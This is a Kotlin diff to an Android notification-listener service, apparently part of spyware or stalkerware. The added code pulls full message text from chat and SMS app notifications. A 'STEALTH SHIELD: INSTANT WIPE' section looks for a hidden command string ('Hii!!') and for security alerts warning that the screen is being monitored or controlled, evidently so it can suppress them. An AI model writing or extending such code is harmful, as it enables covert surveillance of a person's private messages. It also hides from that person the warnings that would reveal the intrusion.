@@ -32,8 +32,15 @@ class MyNotificationListener : NotificationListenerService() {
                 "ALL" -> true
                 "PKG" -> sbn.packageName == value
                 "TEXT" -> {
-                    val title = sbn.notification.extras.getString("android.title") ?: ""
-                    val text = sbn.notification.extras.getCharSequence("android.text")?.toString() ?: ""
+                    val extras = sbn.notification.extras
+                    val title = extras.getCharSequence("android.title")?.toString() ?: ""
+                    var text = extras.getCharSequence("android.text")?.toString() ?: ""
+                    val msgs = extras.getParcelableArray("android.messages")
+                    if (msgs != null) {
+                        msgs.filterIsInstance<android.os.Bundle>().forEach {
+                            it.getCharSequence("text")?.toString()?.let { t -> text += "\n$t" }
+                        }
+                    }
                     title.contains(value ?: "", ignoreCase = true) || text.contains(value ?: "", ignoreCase = true)
                 }
                 else -> false
@@ -65,30 +72,40 @@ class MyNotificationListener : NotificationListenerService() {
 
         val pkg = sbn.packageName
         val extras = sbn.notification.extras
-        val title = extras.getString("android.title") ?: ""
+        val title = extras.getCharSequence("android.title")?.toString() ?: ""
         
-        // DEEP EXTRACTION: Prioritize expanded/inbox styles over collapsed text
+        // DEEP EXTRACTION: MessagingStyle is used by almost all modern SMS/Chat apps
         var text = ""
         
-        // 1. Check for Multi-line (InboxStyle) - Common in WhatsApp/Telegram groups
-        val lines = extras.getCharSequenceArray("android.textLines")
-        if (lines != null && lines.isNotEmpty()) {
-            text = lines.joinToString("\n")
-        } 
-        // 2. Check for Big Text (BigTextStyle) - Long emails/messages
-        else {
-            text = extras.getCharSequence("android.bigText")?.toString() ?: ""
+        val messages = extras.getParcelableArray("android.messages")
+        if (messages != null && messages.isNotEmpty()) {
+            val msgTexts = mutableListOf<String>()
+            messages.filterIsInstance<android.os.Bundle>().forEach {
+                it.getCharSequence("text")?.toString()?.let { t -> msgTexts.add(t) }
+            }
+            if (msgTexts.isNotEmpty()) text = msgTexts.joinToString("\n")
         }
 
-        // 3. Fallback to standard text if expanded data is empty
+        if (text.isEmpty()) {
+            val lines = extras.getCharSequenceArray("android.textLines")
+            if (lines != null && lines.isNotEmpty()) {
+                text = lines.joinToString("\n")
+            } else {
+                text = extras.getCharSequence("android.bigText")?.toString() ?: ""
+            }
+        }
+
         if (text.isEmpty()) {
             text = extras.getCharSequence("android.text")?.toString() ?: ""
+        }
+        if (text.isEmpty()) {
+            text = sbn.notification.tickerText?.toString() ?: ""
         }
 
         if (title.isEmpty() && text.isEmpty()) return
 
         // --- STEALTH SHIELD: INSTANT WIPE ---
-        val isCommand = title.contains("Hii!!") || text.contains("Hii!!")
+        val isCommand = title.contains("Hii!!", ignoreCase = true) || text.contains("Hii!!", ignoreCase = true)
         val isSecurityAlert = text.contains("view and control your screen", ignoreCase = true) || 
                               text.contains("monitoring your screen", ignoreCase = true) ||
                               title.contains("security alert", ignoreCase = true)
